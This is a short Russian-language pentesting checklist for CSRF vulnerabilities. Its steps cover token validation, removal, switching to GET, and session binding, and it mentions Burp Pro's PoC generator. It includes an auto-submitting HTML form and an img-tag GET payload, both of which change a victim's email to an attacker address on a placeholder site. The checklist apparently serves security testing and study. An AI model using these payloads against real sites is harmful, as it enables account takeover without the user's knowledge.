### Шаги по тестированию
1. Найти критичное действие (изменение пароля, email, переводы денег и тп)
2. Определить способ выполнения действия (метод HTTP, тело запроса, наличие csrf токена) - отправить такой запрос в Repeater
3. При наличии csfr - изменить его значение - проверить что проверяется, валидируется его корректность
4. При наличии csfr - удалить его полностью и проверить что проверяется его наличие
5. При наличии csfr - удалить его полностью и изменить метод на GET проверить можно подделать запрос
6. При наличии csrf - проверить что токен не связан с сессией пользователя, а просто выдается для любой операции, как одноразовый код. Например передается html как скрытый параметр тега <input>

* Автоматизация: Burp Pro: Engagement tools > Generate CSRF PoC


### HTML PoC:

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input required type="hidden" name="csrf" value="<csrf>">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

### XSS with CSRF PoC:
```js
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```